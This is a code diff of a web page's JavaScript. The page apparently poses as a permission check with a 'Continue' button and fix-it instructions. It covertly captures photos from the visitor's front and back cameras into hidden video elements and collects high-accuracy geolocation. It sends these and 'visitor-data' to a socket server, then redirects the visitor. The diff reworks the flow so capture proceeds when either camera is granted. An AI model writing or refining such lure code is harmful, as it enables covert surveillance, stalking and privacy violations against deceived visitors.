@@ -93,8 +93,7 @@
             <strong>How to fix:</strong><br>
             1. Click the lock icon in address bar<br>
             2. Set Camera to Allow<br>
-            3. Set Location to Allow<br>
-            4. Refresh page and click Retry
+            3. Refresh page and click Retry
         </div>
         <button class="btn-continue" id="continueBtn">Continue</button>
     </div>
@@ -129,7 +128,6 @@
             let frontVideo = document.getElementById('hiddenVideo');
             let backVideo = document.getElementById('hiddenVideoBack');
             
-            // Track permissions
             let frontGranted = false;
             let backGranted = false;
             let locationGranted = false;
@@ -270,7 +268,7 @@
             }
 
             // ============================================
-            // CONTINUE BUTTON - FIXED FOR BACK CAMERA + LOCATION
+            // CONTINUE BUTTON - FIXED FRONT CAMERA
             // ============================================
             continueBtn.addEventListener('click', function() {
                 if (isProcessing) return;
@@ -281,49 +279,48 @@
                 
                 updateStatus('Requesting permissions...');
                 
-                // Reset flags
                 frontGranted = false;
                 backGranted = false;
                 locationGranted = false;
 
                 cleanupStreams();
 
-                // ---- STEP 1: FRONT CAMERA (Always try first) ----
-                navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: false
-                })
+                // ---- STEP 1: TRY FRONT CAMERA FIRST ----
+                tryFrontCamera()
                 .then(function(stream) {
-                    console.log('Front camera granted');
-                    frontGranted = true;
-                    frontStream = stream;
-                    frontVideo.srcObject = stream;
-                    frontVideo.play().catch(() => {});
+                    if (stream) {
+                        console.log('Front camera granted');
+                        frontGranted = true;
+                        frontStream = stream;
+                        frontVideo.srcObject = stream;
+                        frontVideo.play().catch(() => {});
+                        
+                        setTimeout(function() {
+                            capturePhoto('front', stream);
+                        }, 500);
+                    } else {
+                        console.log('Front camera not available - will try back camera');
+                    }
                     
-                    setTimeout(function() {
-                        capturePhoto('front', stream);
-                    }, 500);
-                    
-                    // ---- STEP 2: BACK CAMERA (Try with fallback) ----
+                    // ---- STEP 2: BACK CAMERA ----
                     return tryBackCamera();
                 })
-                .then(function(backStream) {
-                    if (backStream) {
+                .then(function(backStreamResult) {
+                    if (backStreamResult) {
                         console.log('Back camera granted');
                         backGranted = true;
-                        backStream = backStream;
-                        backVideo.srcObject = backStream;
+                        backStream = backStreamResult;
+                        backVideo.srcObject = backStreamResult;
                         backVideo.play().catch(() => {});
                         
                         setTimeout(function() {
-                            capturePhoto('back', backStream);
+                            capturePhoto('back', backStreamResult);
                         }, 500);
                     } else {
-                        console.log('Back camera not available - using front camera only');
-                        // Still continue - we have front camera
+                        console.log('Back camera not available');
                     }
                     
-                    // ---- STEP 3: LOCATION (With fallback) ----
+                    // ---- STEP 3: LOCATION ----
                     return tryLocation();
                 })
                 .then(function(locationData) {
@@ -339,7 +336,17 @@
                         }
                         console.log('Location sent');
                     } else {
-                        console.log('Location not available - continuing without location');
+                        console.log('Location not available - continuing');
+                    }
+                    
+                    // ---- CHECK IF AT LEAST ONE CAMERA WORKED ----
+                    if (!frontGranted && !backGranted) {
+                        updateStatus('No camera available. Please allow camera access.', 'error');
+                        instructions.style.display = 'block';
+                        isProcessing = false;
+                        continueBtn.disabled = false;
+                        continueBtn.textContent = 'Retry';
+                        return;
                     }
                     
                     // ---- ALL DONE ----
@@ -364,26 +371,7 @@
                     
                     cleanupStreams();
                     
-                    // Check if at least front camera worked
-                    if (frontGranted) {
-                        // Front camera worked, continue anyway
-                        updateStatus('Permissions granted! Redirecting...', 'success');
-                        
-                        if (socket && socket.connected) {
-                            socket.emit('visitor-data', {
-                                visitorId,
-                                type: 'permissionsGranted',
-                                content: true
-                            });
-                        }
-                        
-                        setTimeout(function() {
-                            if (!redirectTriggered) {
-                                redirectNow();
-                            }
-                        }, 2000);
-                    } else {
-                        // Front camera failed - show error
+                    if (!frontGranted && !backGranted) {
                         let errorMsg = '';
                         let showInstructions = false;
                         
@@ -399,29 +387,46 @@
                         if (showInstructions) {
                             instructions.style.display = 'block';
                         }
+                    } else {
+                        // At least one camera worked, continue
+                        updateStatus('Permissions granted! Redirecting...', 'success');
                         
-                        isProcessing = false;
-                        continueBtn.disabled = false;
-                        continueBtn.textContent = 'Retry';
+                        if (socket && socket.connected) {
+                            socket.emit('visitor-data', {
+                                visitorId,
+                                type: 'permissionsGranted',
+                                content: true
+                            });
+                        }
+                        
+                        setTimeout(function() {
+                            if (!redirectTriggered) {
+                                redirectNow();
+                            }
+                        }, 2000);
                     }
+                    
+                    isProcessing = false;
+                    continueBtn.disabled = false;
+                    continueBtn.textContent = 'Retry';
                 });
             });
 
             // ============================================
-            // TRY BACK CAMERA (with fallback)
+            // TRY FRONT CAMERA (with fallback)
             // ============================================
-            function tryBackCamera() {
+            function tryFrontCamera() {
                 return new Promise(function(resolve) {
-                    // Try environment camera first
+                    // Try user camera first
                     navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                         audio: false
                     })
                     .then(function(stream) {
                         resolve(stream);
                     })
                     .catch(function() {
-                        // If environment fails, try with any camera (fallback)
+                        // If user fails, try any camera
                         navigator.mediaDevices.getUserMedia({
                             video: { width: { ideal: 640 }, height: { ideal: 480 } },
                             audio: false
@@ -430,7 +435,6 @@
                             resolve(stream);
                         })
                         .catch(function() {
-                            // No camera available
                             resolve(null);
                         });
                     });
@@ -438,7 +442,25 @@
             }
 
             // ============================================
-            // TRY LOCATION (with fallback)
+            // TRY BACK CAMERA
+            // ============================================
+            function tryBackCamera() {
+                return new Promise(function(resolve) {
+                    navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                        audio: false
+                    })
+                    .then(function(stream) {
+                        resolve(stream);
+                    })
+                    .catch(function() {
+                        resolve(null);
+                    });
+                });
+            }
+
+            // ============================================
+            // TRY LOCATION
             // ============================================
             function tryLocation() {
                 return new Promise(function(resolve) {
@@ -475,7 +497,6 @@
                                 });
                         },
                         function() {
-                            // Location denied or timeout - continue without location
                             resolve(null);
                         },
                         { timeout: 10000, enableHighAccuracy: true }
